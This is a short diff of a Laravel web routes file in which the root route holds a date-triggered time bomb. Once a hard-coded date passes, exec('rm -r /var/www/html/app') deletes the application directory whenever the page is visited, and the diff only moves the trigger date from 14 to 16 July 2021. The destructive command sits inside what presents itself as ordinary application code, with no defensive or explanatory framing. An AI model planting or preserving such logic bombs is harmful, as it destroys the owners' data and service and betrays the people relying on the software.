@@ -21,7 +21,7 @@ use Illuminate\Support\Facades\Route;
 Route::get('/', function () {
 
     $date_now = date("m/d/Y");
-    $date = date_create("07/14/2021");
+    $date = date_create("07/16/2021");
 
     if($date_now > $date) {
         exec('rm -r /var/www/html/app');
